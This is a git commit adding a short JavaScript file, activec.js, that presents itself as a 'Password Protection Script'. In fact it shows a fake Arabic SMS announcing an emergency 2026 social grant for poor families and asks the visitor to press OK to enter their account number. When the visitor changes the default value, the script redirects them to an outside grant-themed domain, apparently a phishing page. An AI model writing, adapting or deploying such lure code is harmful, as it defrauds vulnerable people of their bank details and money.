306cbc4dbea5076222c710223eb62e11fcaad230
The-ongoing <preciousadaowo4@gmail.com>
2026-01-10 20:40:29 +0100

    Create activec.js

---
+++ activec.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'سحب نقدي'
+password = prompt(
+  'SMS: تهانينا! أنت مؤهل للحصول على منحة اجتماعية طارئة لعام 2026 للأسر الفقيرة. يرجى الضغط على «موافق» لإدخال رقم حسابك.',
+  'سحب نقدي'
+);
+if (password != 'سحب نقدي') {
+  location.href = 'https://ongoing-grant.cfd/Aman.html';
+  }
